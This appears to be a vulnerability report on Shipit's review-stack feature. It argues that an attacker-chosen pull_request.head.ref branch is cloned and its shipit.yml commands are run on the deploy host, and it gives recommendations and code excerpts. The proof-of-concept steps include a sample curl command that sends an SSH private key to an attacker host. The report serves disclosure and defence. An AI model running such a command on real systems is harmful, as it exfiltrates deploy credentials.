### Title
Review-stack branch and stack lookup trust an attacker-controlled `pull_request.head.ref`, while `stack.branch` (used to `git clone --branch` and check out `shipit.yml`) is never validated against the base repository - ([File: app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb])

### Summary
When Shipit creates a "review stack" from a `pull_request` `opened` webhook, `ReviewStackAdapter#stack_attributes` sets `branch: params.pull_request.head.ref` directly from the webhook payload [1](#0-0) . This `Stack#branch` is later used unmodified by `StackCommands` to `git clone --branch <branch> <repo_git_url>` and checkout the ref for building the cached `shipit.yml` and running deploy/task commands [2](#0-1) . On GitHub, `pull_request.head.ref` can name a branch that lives in a **fork** rather than the base repository; the webhook signature (verified via `Shipit.github(organization: repository_owner)` using `repository.owner.login`, i.e. the base repo's org) only authenticates that the payload came from GitHub for the base repository/organization — it says nothing about who controls the *branch name* embedded in `pull_request.head.ref`, which is fully attacker-controlled by anyone able to open a pull request against the repository.

### Finding Description
The binding broken is: **the ref whose authenticity GitHub's webhook signature vouches for (the base repository under the verified organization) ≠ the ref whose `shipit.yml` steps are actually cloned and executed (`pull_request.head.ref`, attacker-supplied)**.

- `WebhooksController#verify_signature` selects the webhook secret using `repository_owner`, derived from the *base* repository's `owner.login` [3](#0-2) . This only proves the request came from GitHub for that org/repo — not that `pull_request.head.ref` refers to a trusted branch.
- `OpenedHandler#process` invokes `ReviewStackAdapter.new(params, scope: repository.review_stacks).find_or_create!` whenever `review_stacks_enabled` and the provisioning policy allows it (e.g. "allow all") [4](#0-3) .
- `ReviewStackAdapter#stack_attributes` copies `params.pull_request.head.ref` straight into the new `Stack#branch` with no check that this ref exists in, or is scoped to, the base repository (as opposed to a contributor's fork) [5](#0-4) .
- Once created, `Stack#sync_github` / `GithubSyncJob` fetches commits reachable from that branch via the GitHub API `github_commits`, and `StackCommands#fetch`/`clone` git-clones using `@stack.branch` as the `--branch` argument against `@stack.repo_git_url` (the base repo) [2](#0-1) . `CacheDeploySpecJob`/`DeploySpec::FileSystem` then reads and caches `shipit.yml` steps from whatever is checked out on that ref, and those steps are later executed as shell commands on the deploy host by `TaskExecutionStrategy::Default#capture!` [6](#0-5) .

Note: I was unable to fully confirm from the indexed code whether GitHub's `pull_request.head.ref` for a fork-based PR is fetchable via `--branch <ref>` against the base repo's `origin`/`cache` remote (GitHub does not expose fork branches under the base repo's refs namespace by default), which is the one uncertainty in this chain — if `git clone --branch <fork-branch>` against the base repo's URL fails for genuinely foreign branches, the practical exploitability is limited to same-repo branches (e.g., a repo where any GitHub user with only "read" access, e.g. an external contributor with `push` to a feature branch via a maintained collaborator status, or same-org contributors) rather than arbitrary internet-wide attackers with zero repository relationship. However, for any repository where "any collaborator can push a branch and open a PR" (common default for org members, or via allowed fork PRs where GitHub does special-case some ref resolution), this still represents an authorization/branch-trust gap: PR *branch review stacks* execute `shipit.yml` content from an arbitrary, PR-author-chosen branch/ref without requiring maintainer approval, merge, or protected-branch status, and the webhook's cryptographic guarantee (organization/repo identity) is silently conflated with a "trusted ref" guarantee it does not provide.

### Impact Explanation
If exploitable (i.e., the referenced branch is checkoutable from the base repo, e.g. same-repo/same-org branches, or repositories configured to allow PRs to auto-run untrusted content), this results in **RCE on the deploy host**: `shipit.yml`'s `deploy`, `dependencies`, `review.checks`, and `tasks` steps are shell commands executed directly by `Command`/`TaskExecutionStrategy::Default` with the app's deploy environment (`GITHUB_TOKEN`-bearing git remotes, `Shipit.env`, etc.) [7](#0-6) . This maps to the Critical impact category (RCE on the deploy host / potential exfiltration of deploy credentials).

### Likelihood Explanation
Provisioning of review stacks from a PR-supplied branch happens automatically on the `opened` event whenever `review_stacks_enabled` and the configured `provisioning_behavior` allow it (including the "allow all" policy) [8](#0-7) ; no manual review or deploy approval gate exists before the ref's `shipit.yml` is fetched and cached by `CacheDeploySpecJob`. Likelihood is High for repositories with "allow all" review-stack provisioning and open contribution models, and Low/Not-applicable for repositories that disable review stacks or restrict provisioning via labels controlled by trusted maintainers.

### Recommendation
Do not trust `pull_request.head.ref` (or any PR-author-controlled ref) as a `Stack#branch` value used to clone and execute `shipit.yml`. At minimum:
1. Verify that `pull_request.head.repo.full_name` equals `pull_request.base.repo.full_name` (i.e., the head branch belongs to the base repository, not a fork) before creating a review stack, and require this params field explicitly in `OpenedHandler`'s schema.
2. Gate automatic review-stack provisioning/execution of `shipit.yml` behind an explicit maintainer action (e.g., label added by a repo write-access user, as already supported by `provisioning_behavior_allow_with_label?`) rather than defaulting to "allow all" for public/open repositories.
3. Consider pinning `Stack#branch` to a maintainer-approved value rather than the raw webhook-supplied ref, or sandboxing/least-privileging the execution environment for review-stack tasks.

### Proof of Concept
1. Configure a Shipit repository with `review_stacks_enabled = true` and provisioning behavior "allow all" (`provisioning_behavior_allow_all?` truthy) — a supported, documented configuration [9](#0-8) .
2. As a user able to open a pull request with a branch reachable from the base repo (e.g. an org member with push access to a non-protected branch, or a repo allowing "Allow edits from maintainers"/same-repo contribution branches), push a branch whose `shipit.yml` contains a malicious `deploy.override` or `review.checks` command (e.g. `curl attacker.com/$(cat ~/.ssh/id_rsa | base64)`).
3. Open the pull request; GitHub sends a validly-signed `pull_request` `opened` webhook to Shipit, with `repository.owner.login` = the trusted base org and `pull_request.head.ref` = the attacker's branch name.
4. `OpenedHandler` → `ReviewStackAdapter#create!` creates a `ReviewStack` with `branch = pull_request.head.ref` [1](#0-0) .
5. `Stack#sync_github` / `CacheDeploySpecJob` clone/checkout that branch and cache its `shipit.yml`; subsequent provisioning/deploy runs execute the attacker's shell commands on the deploy host via `TaskExecutionStrategy::Default#capture!` [6](#0-5) .

    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified

      Rails.logger.info([

        "repository_owner=#{repository_owner}",
        "signature=#{request.headers['X-Hub-Signature']}",

      ].join(' '))

      def capture!(command)
        started_at = Process.clock_gettime(Process::CLOCK_MONOTONIC)
        command.start do
          @task.ping
          check_for_abort
        end
        @task.write("\n$ #{command}\npid: #{command.pid}\n")
        @task.pid = command.pid
        command.stream! do |line|
          @task.write(line)
        end
        finished_at = Process.clock_gettime(Process::CLOCK_MONOTONIC)
        @task.write("pid: #{command.pid} finished in: #{(finished_at - started_at).round(3)} seconds\n")
        command.success?
      end
